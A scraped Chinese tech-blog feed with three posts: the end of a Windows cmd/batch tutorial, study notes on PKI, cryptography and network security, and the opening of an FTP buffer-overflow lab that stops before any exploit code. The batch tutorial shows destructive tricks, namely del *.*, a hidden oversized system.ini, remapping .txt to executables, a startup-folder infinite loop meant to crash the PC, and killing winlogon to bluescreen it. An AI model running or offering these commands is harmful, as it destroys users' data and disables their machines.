显示所有文件，包括隐藏文件</li></ol><pre class=" language-bash"><code class="language-bash">del *.txt     <span class="token comment" spellcheck="true">#删除所有以.txt结尾的文件</span>del *.*       <span class="token comment" spellcheck="true">#删除所有文件</span>注： *为通配符，代表任何字符，任意长度</code></pre><ol start="10"><li><font color="#fb8c00">md 文件夹名</font> 创建文件夹</li><li><font color="#fb8c00">dir</font>显示文件夹内容</li><li><font color="#fb8c00">ren 原文件名 新文件名</font> 重命名(文件、文件夹均可)</li></ol><h3 id="特殊命令"><a href="#特殊命令" class="headerlink" title="特殊命令"></a>特殊命令</h3><p>以下命令博主测试只适用于WIN XP系统。</p><ol><li><p>创建一个超大的空文件</p><pre class=" language-bash"><code class="language-bash">fsutil <span class="token function">file</span> createnew c:\system.ini 409600000    <span class="token comment" spellcheck="true">#最后一个参数为文件大小，单位为字节 </span></code></pre></li><li><p>改变超大空文件的属性</p><pre class=" language-bash"><code class="language-bash">attrib +s +a +h +r system.ini</code></pre></li></ol><ul><li><font color="#fb8c00">+s</font> 为文件增加系统文件属性</li><li><font color="#fb8c00">+a</font> 为文件增加存档文件属性</li><li><font color="#fb8c00">+r</font> 为文件增加只读属性</li><li><font color="#fb8c00">+h</font> 为文件增加隐藏属性</li></ul><blockquote><p>注：隐藏的系统文件需要在文件夹选项里修改“隐藏系统文件”选项即可查看，或使用dir /a命令查看所有文件(包含隐藏文件)<br>3. 改变文件关联性</p></blockquote><pre class=" language-bash"><code class="language-bash">assoc .txt<span class="token operator">=</span>exefile    将txt文件当成可执行文件执行assoc .txt<span class="token operator">=</span>txtfile    将txt文件当成txt文件执行</code></pre><blockquote><p>注：单独使用assoc可查看此电脑所有文件关联性</p></blockquote><ol start="4"><li>定时<pre class=" language-bash"><code class="language-bash"><span class="token function">shutdown</span> -s -t 100</code></pre></li></ol><ul><li><font color="#fb8c00">-s</font> 关机</li><li><font color="#fb8c00">-r</font> 重启</li><li><font color="#fb8c00">-l</font> 注销</li><li><font color="#fb8c00">-f</font> 强制(此条命令可以强制关机、重启)</li><li><font color="#fb8c00">-t</font> 设置关机时间</li><li><font color="#fb8c00">100</font> 在100s后关机</li></ul><blockquote><p>注：此命令产生的效果只能用shutdown -a解除，且在Windows其他系统中均适用。</p></blockquote><h3 id="重定向符号"><a href="#重定向符号" class="headerlink" title="重定向符号"></a>重定向符号</h3><ol><li><font color="#fb8c00">&gt;</font>  覆盖，把前面的内容输入到后边的文件中，会清除文件原有文件</li><li><font color="#fb8c00">&gt;&gt;</font> 追加，将前面的内容加在文件原有内容的后面</li><li><font color="#fb8c00">2&gt;</font>错误重定向，把错误信息输入到后边的文件中，会删除文件原有内容。</li></ol><h2 id="批处理的编写"><a href="#批处理的编写" class="headerlink" title="批处理的编写"></a>批处理的编写</h2><h3 id="批处理的作用"><a href="#批处理的作用" class="headerlink" title="批处理的作用"></a>批处理的作用</h3><p>自上而下成批的处理每一条命令，直到执行到最后一条。即使其中一条命令错误，也会继续向下执行。Windows下的批处理文件对应Linux下的Shell 脚本。</p><blockquote><p>注：批处理文件的运行方式为打开cmd窗口运行.bat文件中的命令，执行完毕后立即关闭cmd窗口，使用pause命令可以暂停命令的执行，按下回车键又继续执行。</p></blockquote><h3 id="如何创建批处理"><a href="#如何创建批处理" class="headerlink" title="如何创建批处理"></a>如何创建批处理</h3><p>扩展名：<font color="#fb8c00">.bat</font><br>创建方法：新建一个记事本文件，然后将扩展名改为.bat<br>编辑方式：右键点击文件选择编辑，一行一条命令</p><h3 id="批处理命令"><a href="#批处理命令" class="headerlink" title="批处理命令"></a>批处理命令</h3><h4 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h4><ol><li><font color="#fb8c00">pause</font> 暂停批处理运行，按下回车继续执行(只在批处理中有意义)</li><li><font color="#fb8c00">@echo off</font> 关闭回显，屏蔽过程，只输出结果，建议放在首行</li><li><font color="#fb8c00">color 颜色代码</font> 改变字体颜色</li><li><font color="#fb8c00">title 内容</font> 修改cmd框的主题内容 </li><li><font color="#fb8c00">echo.</font> 空一行(只在批处理中有意义</li><li><font color="#fb8c00">copy con xx.bat</font> 往bat文件里写入批处理命令，使用ctrl+Z终止</li></ol><h4 id="死循环"><a href="#死循环" class="headerlink" title="死循环"></a>死循环</h4><p>执行以下命令会给计算机造成命令死循环，会导致计算机崩溃。(低版本Windows可执行)</p><pre class=" language-bash"><code class="language-bash">copy test.bat 开始启动程序地址:dstartgoto d</code></pre><ul><li><font color="#fb8c00">copy test.bat 开始启动程序地址</font> 开机执行</li><li><font color="#fb8c00">:d</font> 告诉计算机这是一个分区</li><li><font color="#fb8c00">start</font> 后可跟参数或网址，用于启动可执行程序或网页，若没有参数默认为启动cmd</li><li><font color="#fb8c00">goto d</font> 转回d分区执行   </li></ul><blockquote><p>注：开始启动程序的地址查找方式：打开开始菜单中的运行-&gt;输入shell:startup ，然后所展示的文件夹即为开始启动程序。针对不同的计算机用户名也不同的问题，可以使用C盘中的一个userprofile变量，此变量为当前用户的家目录路径。 则管理员文件夹之前的路径及管理员文件夹可以用%userprofile% \ 变量代替。</p></blockquote><h4 id="条件循环"><a href="#条件循环" class="headerlink" title="条件循环"></a>条件循环</h4><pre class=" language-bash"><code class="language-bash">@echo off:menu<span class="token keyword">echo</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token keyword">echo</span> 1.关机<span class="token keyword">echo</span> 2.退出<span class="token keyword">echo</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token keyword">set</span> /p num<span class="token operator">=</span>你的选择：echo.<span class="token keyword">if</span> %num% <span class="token operator">==</span> 1 goto 1<span class="token keyword">if</span> %num% <span class="token operator">==</span> 2 goto 2:1<span class="token keyword">set</span> /p a<span class="token operator">=</span>请输入关机时间<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:    <span class="token comment" spellcheck="true">#/p的意义在于指定a的值由用户输入</span><span class="token function">shutdown</span> -s -f -t %a%     <span class="token comment" spellcheck="true">#%a%的意思是变量</span>goto menu:2<span class="token keyword">exit</span></code></pre><blockquote><p>注：颜色代码通过DOS命令color ?进行查看</p></blockquote><h4 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h4><pre class=" language-bash"><code class="language-bash">ntsd -c -q -pn winlogon.exe   <span class="token comment" spellcheck="true">#杀死系统的登录进程，使计算机蓝屏</span></code></pre><blockquote><p>注：此命令只对Windows2003或XP管用</p></blockquote><h4 id="杀死指定进程"><a href="#杀死指定进程" class="headerlink" title="杀死指定进程"></a>杀死指定进程</h4><p>可用taskkill命令杀死进程(危险命令，谨慎使用)</p><pre class=" language-bash"><code class="language-bash">@echo off<span class="token keyword">echo</span> 0a    <span class="token comment" spellcheck="true">#字体显示为亮绿色</span>taskkill /im explorer.exe /f   <span class="token comment" spellcheck="true">#/im指定进程名 /f表示强制执行</span><span class="token function">ping</span> -n 10 127.0.0.1 1<span class="token operator">></span>nul 2<span class="token operator">></span>nul  <span class="token comment" spellcheck="true">#造成中间时间间隔,1>nul 2>nul将结果屏蔽</span>start c:\windows\explorer.exe   <span class="token comment" spellcheck="true">#重启进程，进程所在路径</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 知识点总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PKI</title>
      <link href="/2019/12/01/pki1/"/>
      <url>/2019/12/01/pki1/</url>
      
        <content type="html"><![CDATA[<h2 id="PKI概述"><a href="#PKI概述" class="headerlink" title="PKI概述"></a>PKI概述</h2><p>PKI(Public Key Infrastructure，公钥基础设施)</p><ul><li>作用：通过加密技术和数字签名保证信息的安全</li><li>组成：公钥加密技术、数字证书、CA、RA</li></ul><h3 id="PKI应用"><a href="#PKI应用" class="headerlink" title="PKI应用"></a>PKI应用</h3><ul><li>SSL/HTTPS</li><li>IPsecVPN</li><li>部分远程访问VPN</li></ul><h2 id="信息安全三要素"><a href="#信息安全三要素" class="headerlink" title="信息安全三要素"></a>信息安全三要素</h2><p>机密性、完整性、身份验证/操作的不可否认性</p><h2 id="公钥加密技术"><a href="#公钥加密技术" class="headerlink" title="公钥加密技术"></a>公钥加密技术</h2><ul><li>作用：实现对信息加密、数字签名等安全保障</li><li>加密算法：(1)对称加密算法(加解密的密钥一致)  (2)非对称加密算法：通信双方各生产一对公私钥，双方各自交换公钥，公钥和私钥互为加解密关系，且公钥私钥不能相互逆推。</li></ul><h3 id="HASH算法"><a href="#HASH算法" class="headerlink" title="HASH算法"></a>HASH算法</h3><p>HASH算法(MD5/SHA):不可逆加密算法，不需要密钥，无法进行解密。</p><h2 id="网络安全问题概述"><a href="#网络安全问题概述" class="headerlink" title="网络安全问题概述"></a>网络安全问题概述</h2><p>计算机网络上的通信面临以下四种威胁：</p><ul><li>截获：从网络上窃听他人的通信内容</li><li>中断：有意中断他人在网络上的通信</li><li>篡改：故意篡改网络上传送的报文</li><li>伪造：伪造信息在网络上传送</li></ul><h3 id="对攻击的分类"><a href="#对攻击的分类" class="headerlink" title="对攻击的分类"></a>对攻击的分类</h3><p>截获信息的攻击称为被动攻击，而更改信息和拒绝用户使用资源属于主动攻击</p><ul><li>在被动攻击中，攻击者只是观察和分析某一个协议数据单元PDU而不干扰信息流</li><li>主动攻击是指攻击者对某个连接中通过的PDU进行各种处理(更改报文流、拒绝报文服务、伪造连接初始化)</li></ul><h3 id="恶意程序"><a href="#恶意程序" class="headerlink" title="恶意程序"></a>恶意程序</h3><ul><li>计算机病毒：会传染其他程序的程序，传染是通过修改其他程序来把自身或其变种复制进去完成的</li><li>计算机蠕虫：通过网络的通信功能将自身从一个结点发送到另一个结点并启动运行的程序</li><li>特洛伊木马：一种程序，它执行的功能超出所声称的功能</li><li>逻辑炸弹：一种当运行环境满足某种特定条件时执行其他特殊功能的程序</li></ul><h3 id="计算机网络安全的内容"><a href="#计算机网络安全的内容" class="headerlink" title="计算机网络安全的内容"></a>计算机网络安全的内容</h3><ul><li>保密性</li><li>安全协议的设计</li><li>访问控制<br>一般数据加密模型如下图所示：<br><img src="https://pic1.superbed.cn/item/5de4acfb119afd7d7ec50c41.jpg" alt=""></li></ul><h2 id="两类密码体制"><a href="#两类密码体制" class="headerlink" title="两类密码体制"></a>两类密码体制</h2><h3 id="对称密钥密码体制"><a href="#对称密钥密码体制" class="headerlink" title="对称密钥密码体制"></a>对称密钥密码体制</h3><p>对称密钥系统：加密密钥和解密密钥是相同的密码体制</p><h4 id="数据加密标准DES"><a href="#数据加密标准DES" class="headerlink" title="数据加密标准DES"></a>数据加密标准DES</h4><p>数据加密标准DES属于常规密钥密码体制，是一种分组密码</p><ul><li>在加密前，对整个明文进行分组，每一个组长为64位</li><li>对64位的明文进行IP置换，然后分成左右等长的、各32位的两个分组。</li><li>在48位子密钥的作用下，进行16轮乘积变换运算(最后一轮左右交换位置)</li><li>最后将各组密文串接起来，得出整个密文</li><li>使用的密钥为64位(实际密钥长度为56位，有8位用奇偶校验)<br>DES的保密性取决于对密钥的保密，而算法是公开的。</li></ul><h4 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h4><p>AES的密钥长度为：128/192/256，加密时会执行10次轮函数(前9次都是一样的，只有第10次不同)。明文分组用字节为单位的正方向矩阵描述(状态矩阵)，<br>加密过程如下：</p><ul><li>轮密钥加</li><li>字节代换：S盒，逆S盒，状态矩阵中的每个元素(含1个字节)将字节的高4位作为行，低4位作为列，取S盒的值作为输出</li><li>行位移，第一行不动，第二行移动1位，第三行移动2位，以此类推</li><li>列混合：通过矩阵相乘实现</li><li>轮密钥加：128位密钥同状态矩阵中的数据进行逐位异或操作</li></ul><h3 id="非对称密钥密码体制"><a href="#非对称密钥密码体制" class="headerlink" title="非对称密钥密码体制"></a>非对称密钥密码体制</h3><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>原理：基于一个大因数很难被分解成两个质数相乘<br>X的欧拉函数：小于X且和X互质的数的个数。<br>模反元素：如果a与n互质，则一定可以找到一个整数b，使得ab-1被n整除<br>RSA加/解密过程</p><ul><li>选取两个大的质数P/Q，PQ=N</li><li>N的欧拉函数=(P-1)(Q-1)</li><li>E:比1大比N的欧拉函数小，且与N的欧拉函数互质</li><li>D：ED-1可被N的欧拉函数整除</li><li>密文=明文^E mod N ，公钥(E,N)</li><li>明文=密文^D mod N ，私钥(D,N)</li></ul><h3 id="公钥密码体制"><a href="#公钥密码体制" class="headerlink" title="公钥密码体制"></a>公钥密码体制</h3><p>公钥密码体制使用不同的加密密钥与解密密钥。是一种“由已知加密密钥推导出解密密钥在计算上是不可行的”密码体制</p><h4 id="加密密钥和解密密钥"><a href="#加密密钥和解密密钥" class="headerlink" title="加密密钥和解密密钥"></a>加密密钥和解密密钥</h4><ul><li>在公钥密码体制中，加密密钥(公钥)PK是公开信息，解密密钥(私钥)SK是需要保密的</li><li>加密算法E和解密算法D也都是公开的</li><li>虽然密钥SK是由公钥PK决定的，但却不能根据PK计算出SK</li></ul><h4 id="公钥算法的特点"><a href="#公钥算法的特点" class="headerlink" title="公钥算法的特点"></a>公钥算法的特点</h4><ul><li>发送者在发送信息之前先要获取对方的公钥对明文进行加密</li><li>发送者A用B的公钥对明文加密后，接受者B用自己的私钥解密，即可恢复明文</li><li>解密密钥是接收者的专用密钥，对其他所有人都保密</li><li>加密密钥是公开的，但它不能用来解密</li><li>不可能从公钥推导出私钥</li><li>加解密算法都是公开的</li></ul><h2 id="鉴别"><a href="#鉴别" class="headerlink" title="鉴别"></a>鉴别</h2><ul><li>对方被动攻击的重要措施是加密，而对付主动攻击中的篡改和伪造则需要鉴别(authentication)</li><li>报文鉴别使得通信的接收方能够验证所收到的报文</li></ul><h3 id="报文鉴别"><a href="#报文鉴别" class="headerlink" title="报文鉴别"></a>报文鉴别</h3><p>许多报文并不需要加密但却需要数字签名，以便于让报文的接收者能够鉴别报文的真伪。然而对很长的报文进行数字签名会使得计算机增加很大的负担(需要进行长时间的运算)，当我们传送不需要加密的报文时，可以使用MD来鉴别报文的真伪</p><h4 id="报文摘要MD-Message-Digest"><a href="#报文摘要MD-Message-Digest" class="headerlink" title="报文摘要MD(Message Digest)"></a>报文摘要MD(Message Digest)</h4><p>报文摘要是指单向哈希函数算法将任意长度的输入报文经计算得出固定位的输出称为报文摘要</p><h3 id="实体鉴别"><a href="#实体鉴别" class="headerlink" title="实体鉴别"></a>实体鉴别</h3><p>报文鉴别是对每个收到的报文都要鉴别报文的发送者，而实体鉴别是在系统接入的全部持续时间内对和自己通信的对方实体只需验证一次。</p><h3 id="摘要升级"><a href="#摘要升级" class="headerlink" title="摘要升级"></a>摘要升级</h3><p>将报文摘要H利用A的私钥加密发送给B，B接收到密文摘要后用A的公钥进行解密得到摘要明文。</p><h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><p>数字签名是由发送者的私钥加密摘要形成的，数字签名必须保证以下三点：</p><ul><li>报文鉴别：接收者能够核实发送者对报文的签名</li><li>报文的完整性：发送者事后不能抵赖对报文的签名</li><li>不可否认：接收者不能伪造对报文的签名</li></ul><h3 id="数字签名的实现"><a href="#数字签名的实现" class="headerlink" title="数字签名的实现"></a>数字签名的实现</h3><p><img src="https://pic3.superbed.cn/item/5de4ad2c119afd7d7ec51ce4.jpg" alt=""></p><ul><li>因为除了A外没有人能具有A的私钥，所以除A外没有别人能产生这个密文。因此B相信报文X是A签名发送的</li><li>若A要抵赖曾经发送报文给B，B可将明文和对应的密文出示给第三者，第三者很容易用A的公钥去证实A确实发送X给B</li><li>如B将报文X伪造成X1，则B不能在第三者前出示对应的密文，这样就证明了B伪造报文。</li></ul><p>具有保密性的数字签名：<br><img src="https://pic.superbed.cn/item/5de4ad4f119afd7d7ec5287c.jpg" alt=""></p><h2 id="密钥分配"><a href="#密钥分配" class="headerlink" title="密钥分配"></a>密钥分配</h2><p>目前常用的密钥分配方式是设立密钥分配中心KDC(Key Distribution)，通过KDC来分配密钥。</p><h3 id="对称密钥"><a href="#对称密钥" class="headerlink" title="对称密钥"></a>对称密钥</h3><p>用户A和B都是KDC的登记用户，并已经在KDC的服务器上安装了各自和KDC进行通信的主密钥(master key)KA和KB。</p><h3 id="公钥的分配"><a href="#公钥的分配" class="headerlink" title="公钥的分配"></a>公钥的分配</h3><p>认证中心(Certification Authority,CA)将公钥与其对应的实体(人或实体)进行绑定。</p><ul><li>数字证书的生成：CA收到数字证书申请并认证申请者的真实身份后，把申请者的公钥、身份信息、数字证书的有效期等信息作为消息原文，进行hash生成摘要，并用CA的私钥加密进行签名；数字签名与证书拥有者的公钥、身份信息、证书有效期等其他信息共同组成数字证书。</li><li>数字证书的验证：接收方收到消息证书后，使用CA公钥对数字签名解密生成消息摘要，对证书内容进行hash生成摘要，两份摘要进行比对可证明证书内容的完整性与真实性。</li></ul><h2 id="因特网使用的安全协议"><a href="#因特网使用的安全协议" class="headerlink" title="因特网使用的安全协议"></a>因特网使用的安全协议</h2><h3 id="网络层安全协议"><a href="#网络层安全协议" class="headerlink" title="网络层安全协议"></a>网络层安全协议</h3><h4 id="IPsec与安全关联SA"><a href="#IPsec与安全关联SA" class="headerlink" title="IPsec与安全关联SA"></a>IPsec与安全关联SA</h4><p>网络层保密是指所有在IP数据报中的数据都是加密的。IPsec中最重要的两个部分：</p><ul><li>鉴别首部AH(Authentication Header)：AH鉴别源点和检查数据完整性，但不能保密</li><li>封装安全有效载荷ESP(Encapsulation Security Payload):ESP比AH复杂得多，它鉴别源点、检查数据完整性和提供保密。</li></ul><h5 id="安全关联SA-Security-Association"><a href="#安全关联SA-Security-Association" class="headerlink" title="安全关联SA(Security Association)"></a>安全关联SA(Security Association)</h5><ul><li>在使用AH或ESP之前，先要从源主机到目的主机建立一条网络层的逻辑连接。此逻辑连接叫做安全关联SA。</li><li>IPsec就把传统的因特网无连接的网络层转换为具有逻辑连接的层</li></ul><p>安全关联的特点<br>安全关联是一个单向连接，它有一个三元组唯一的确定，包括：</p><ul><li>安全协议(AH或ESP)的标识符</li><li>此单向连接的源IP地址</li><li>一个32位的连接标识符，称为安全参数索引SPI(Security Parameter Index)<br>对于每个给定的安全关联SA，每个IPsec数据报都有一个存放SPI的字段，通过此SA的所有数据报都使用相同的SPI值。</li></ul><h4 id="鉴别首部协议AH"><a href="#鉴别首部协议AH" class="headerlink" title="鉴别首部协议AH"></a>鉴别首部协议AH</h4><ul><li>在使用鉴别首部协议AH时，把AH首部插在原数据报数据部分的前面，同时把IP首部中的协议字段置为51</li><li>在传输过程中，中间的路由器都不查看AH首部，当数据报到达终点时，目的主机才处理AH字段，以鉴别源点和检查数据报的完整性。<br><img src="https://pic3.superbed.cn/item/5de4adac119afd7d7ec544be.jpg" alt=""></li></ul><h4 id="封装安全有效载荷ESP"><a href="#封装安全有效载荷ESP" class="headerlink" title="封装安全有效载荷ESP"></a>封装安全有效载荷ESP</h4><ul><li>使用ESP时，IP数据报首部的协议字段位置为50，当IP首部检查到协议字段是50时，就知道在IP首部后面紧接着的是ESP首部，同时在原IP数据报后面增加了两个字段，即ESP尾部和ESP数据。</li><li>ESP鉴别和AH中的鉴别数据是一样的，因此，用ESP封装的数据报既有鉴别源站和检查数据报完整性的功能，又能提供保密。</li></ul><p>在IP数据报中的ESP的各字段如下所示：<br><img src="https://pic3.superbed.cn/item/5de4adda119afd7d7ec551fe.jpg" alt=""></p><h3 id="运输层安全协议"><a href="#运输层安全协议" class="headerlink" title="运输层安全协议"></a>运输层安全协议</h3><h4 id="安全套接层SSL"><a href="#安全套接层SSL" class="headerlink" title="安全套接层SSL"></a>安全套接层SSL</h4><ul><li>SSL是安全套接层(Secure Socket Layer)，可对万维网客户与服务器之间传送的数据进行加密和鉴别。</li><li>SSL在双方的联络阶段协商将使用的加密算法和密钥，以及客户与服务器之间的鉴别。</li><li>在联络阶段完成之后，所有传送的数据都使用在联络阶段商定的会话密钥</li><li>SSL不仅被所有常用的浏览器和万维网服务器所支持，而且也是运输层安全协议TLS(Transport Layer Secutiry)的基础。</li></ul><h4 id="HTTP与HTTPS"><a href="#HTTP与HTTPS" class="headerlink" title="HTTP与HTTPS"></a>HTTP与HTTPS</h4><p>HTTPS就是加了SSL的HTTP</p><ul><li>端口不同：Http与Http使用不同的连接方式，用的端口也不一样，前者是80，后者是443；</li><li>资源消耗：和HTTP通信相比，Https通信会由于加减密处理消耗更多的CPU和内存资源；</li><li>开销：Https通信需要证书，而证书一般需要向认证机构购买；<br><img src="https://pic.downk.cc/item/5e8eccc1504f4bcb0421a19c.jpg" alt=""></li></ul><h4 id="https传输过程"><a href="#https传输过程" class="headerlink" title="https传输过程"></a>https传输过程</h4><ol><li>浏览器将自己支持的一套加密规则发送给网站。 </li><li>网站从中选出一组加密算法与HASH算法，并将自己的身份信息以证书的形式发回给浏览器。证书里面包含了网站地址，加密公钥，以及证书的颁发机构等信息。 </li><li>浏览器获得网站证书之后浏览器要做以下工作： </li></ol><ul><li>验证证书的合法性（颁发证书的机构是否合法，证书中包含的网站地址是否与正在访问的地址一致等），如果证书受信任，则浏览器栏里面会显示一个小锁头，否则会给出证书不受信的提示。 </li><li>如果证书受信任，或者是用户接受了不受信的证书，浏览器会生成一串随机数的密码，并用证书中提供的公钥加密。 </li><li>用约定好的HASH算法计算握手消息，并使用生成的随机数对消息进行加密，最后将之前生成的所有信息发送给网站。 </li></ul><ol start="4"><li>网站接收浏览器发来的数据之后要做以下的操作： </li></ol><ul><li>使用自己的私钥将信息解密取出密码，使用密码解密浏览器发来的握手消息，并验证HASH是否与浏览器发来的一致。 </li><li>使用浏览器生成的随机数密码加密一段握手消息，发送给浏览器，浏览器使用随机数密码进行解密</li></ul><blockquote><p>注：上述过程中设计两次请求，包括对称加密、非对称加密 　 </p></blockquote><h5 id="SSL的位置"><a href="#SSL的位置" class="headerlink" title="SSL的位置"></a>SSL的位置</h5><p><img src="https://pic3.superbed.cn/item/5de4adf7119afd7d7ec55a48.jpg" alt=""></p><ul><li>在发送方，SSL接收应用层的数据(HTTP报文或IMAP报文)，对数据进行加密，然后把加密的数据送往TCP套接字</li><li>在接收方，SSL从TCP套接字读取数据，解密后把数据交给应用层。</li></ul><h5 id="SSL提供以下三个功能"><a href="#SSL提供以下三个功能" class="headerlink" title="SSL提供以下三个功能"></a>SSL提供以下三个功能</h5><ul><li>SSL服务器鉴别：允许用户证实服务器的身份。具有SSL功能的浏览器维持一个表，上面有一些可信赖的CA和它们的公钥</li><li>加密SSL会话：客户和服务器交互的所有数据都在发送方加密，在接收方解密</li><li>SSL客户鉴别:允许服务器证实客户身份</li></ul><h4 id="安全电子交易SET"><a href="#安全电子交易SET" class="headerlink" title="安全电子交易SET"></a>安全电子交易SET</h4><p>安全电子交易SET(Secure Electronic Transaction)是专为在因特网上进行安全支付卡交易的协议<br>SET的主要特点是：</p><ul><li>SET是专门为与支付有关的报文进行加密的</li><li>SET协议涉及到三方，即顾客、商家和商业银行。所有在这三方之间交互的敏感信息都被加密</li><li>SET要求这三方都有证书。在SET交易中，商家看不见顾客传送给商业银行的信用卡号码</li></ul><h3 id="应用层的安全协议"><a href="#应用层的安全协议" class="headerlink" title="应用层的安全协议"></a>应用层的安全协议</h3><h4 id="PGP-Pretty-Good-Privacy"><a href="#PGP-Pretty-Good-Privacy" class="headerlink" title="PGP(Pretty Good Privacy)"></a>PGP(Pretty Good Privacy)</h4><ul><li>PGP是一个完整的电子邮件安全软件包，包括加密、鉴别、电子签名和压缩等技术</li><li>PGP并没有使用新的概念，它只是将一些算法如MD5,RSA等综合在一起</li></ul><h4 id="PEM-Privacy-Enhanced-Mail"><a href="#PEM-Privacy-Enhanced-Mail" class="headerlink" title="PEM(Privacy Enhanced Mail)"></a>PEM(Privacy Enhanced Mail)</h4><p>PEM是因特网的邮件加密建议标准，由4个RFC文档来描述。PEM的主要特点有：</p><ul><li>PEM与PGP一样都是对基于RFC 822的电子邮件进行加密和鉴别</li><li>PEM 有比PGP更完善的密钥管理机制</li></ul><h2 id="链路加密和端到端解密"><a href="#链路加密和端到端解密" class="headerlink" title="链路加密和端到端解密"></a>链路加密和端到端解密</h2><h3 id="链路加密"><a href="#链路加密" class="headerlink" title="链路加密"></a>链路加密</h3><p>在采用链路加密的网络中，每条通信链路上的加密都是独立实现的，通常对每条链路使用不同的加密密钥。<br><img src="https://pic2.superbed.cn/item/5de4ae12119afd7d7ec56326.jpg" alt=""><br>相邻结点之间具有相同的密钥，因而密钥管理意义实现，链路加密对于用户来说是透明的(用户看不见)，因为加密功能由通信子网提供</p><h3 id="端到端加密"><a href="#端到端加密" class="headerlink" title="端到端加密"></a>端到端加密</h3><p>端到端加密是在源结点和目的结点对传送的PDU进行加密和解密，报文的安全性不会因中间结点的不可靠而受到影响。<br><img src="https://pic3.superbed.cn/item/5de4ae37119afd7d7ec56d48.jpg" alt=""><br>在端到端加密的情况下，PDU的控制信息部分(如源结点地址、目的结点地址、路由信息等)不能被加密，否则中间结点就不能正确选择路由。</p><h2 id="防火墙-firewall"><a href="#防火墙-firewall" class="headerlink" title="防火墙(firewall)"></a>防火墙(firewall)</h2><ul><li>防火墙是由软件、硬件构成的系统。是一种特殊编程的路由器，用来在两个网络之间实施接入控制策略。</li><li>防火墙内的网络称为“可信赖的网络”，而外部的因特网称为“不可信赖的网络”</li></ul><h3 id="防火墙在互连网络中的位置"><a href="#防火墙在互连网络中的位置" class="headerlink" title="防火墙在互连网络中的位置"></a>防火墙在互连网络中的位置</h3><p><img src="https://pic2.superbed.cn/item/5df58f24a4fbc8614a789c7d.jpg" alt=""></p><h3 id="防火墙的功能"><a href="#防火墙的功能" class="headerlink" title="防火墙的功能"></a>防火墙的功能</h3><p>防火墙的功能有两个：阻止和允许</p><ul><li>阻止就是阻止某种类型的通信量通过防火墙(外部网络和内部网络双向阻止)</li><li>允许的功能与阻止恰好相反</li></ul><h3 id="防火墙分类"><a href="#防火墙分类" class="headerlink" title="防火墙分类"></a>防火墙分类</h3><ul><li>网络级防火墙：用来防止整个网络出现外来非法的入侵。具有分组过滤和授权服务器。分组过滤检查<br>所有流入本网络的信息，然后拒绝不符合实现制定好的一套准则的数据，而后者则是检查用户的登录是否合法</li><li>应用级防火墙：从应用程序来进行接入控制。通常使用应用网关或代理服务器来区分各种应用。例如，可以只允许通过访问万维网的应用，而阻止FTP应用的通过。</li></ul><h2 id="DDos攻击"><a href="#DDos攻击" class="headerlink" title="DDos攻击"></a>DDos攻击</h2><p>客户端不断进行请求链接：服务器端会为每个请求创建一个链接，并向其发送确认报文，然后等待客户端进行确认</p><h3 id="DDos攻击原理"><a href="#DDos攻击原理" class="headerlink" title="DDos攻击原理"></a>DDos攻击原理</h3><ul><li>客户端向服务端发送请求链接数据包</li><li>服务端向客户端发送确认数据包</li><li>客户端不向服务端发送确认数据包，服务器一直等待来自客户端的确认</li></ul><h3 id="DDos预防"><a href="#DDos预防" class="headerlink" title="DDos预防"></a>DDos预防</h3><ul><li>限制同时打开SYN半链接的数目</li><li>缩短SYN半链接的Time out 时间</li><li>关闭不必要的服务</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 计算机网络 </tag>
            
            <tag> PKI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FTP溢出漏洞分析</title>
      <link href="/2019/11/26/ftp/"/>
      <url>/2019/11/26/ftp/</url>
      
        <content type="html"><![CDATA[<h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><ul><li>缓冲区：暂时置放输出或输入资料的内存</li><li>缓冲区溢出：缓冲区溢出是指当计算机向缓冲区填充数据时超出了缓冲区本身的容量，溢出的数据覆盖在合法数据上。</li></ul><h2 id="溢出漏洞测试"><a href="#溢出漏洞测试" class="headerlink" title="溢出漏洞测试"></a>溢出漏洞测试</h2><h3 id="测试准备"><a href="#测试准备" class="headerlink" title="测试准备"></a>测试准备</h3><ul><li>渗透测试目标：FreeFloat FTP Server1.0，该软件带有溢出漏洞</li><li>WindowsXP系统:将该软件放入WindowsXP中，IP地址为192.168.75.130</li><li>Windows 7系统：对该软件进行测试，该主机需带装有python运行环境，IP地址为192.168.75.131。</li><li>Kali Linux系统</li></ul><h3 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h3><h4 id="在WindowsXP中运行软件"><a href="#在WindowsXP中运行软件" class="headerlink" title="在WindowsXP中运行软件"></a>在WindowsXP中运行软件</h4><p>如图所示：<br><img src="https://pic3.superbed.cn/item/5df5bba3a4fbc8614a805eb2.jpg" alt=""></p><h4 id="在Windows7中开始测试"><a href="#在Windows7中开始测试" class="headerlink" title="在Windows7中开始测试"></a>在Windows7中开始测试</h4><h5 id="正常登录"><a href="#正常登录" class="headerlink" title="正常登录"></a>正常登录</h5><p>在终端依次输入以下命令连接FTP：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ftp</span><span class="token function">open</span> 192.168.75.130  //WindowsXP的IP地址</code></pre><p>输入任意用户名和密码登录到FTP，如图所示：<br><img src="https://pic2.superbed.cn/item/5df5bd1aa4fbc8614a809a19.jpg" alt=""></p><p>现在我们已经成功登录，可以使用FTP中的任意资源了。(这里使用任何一个用户名都可以成功登录)</p><h5 id="溢出测试"><a 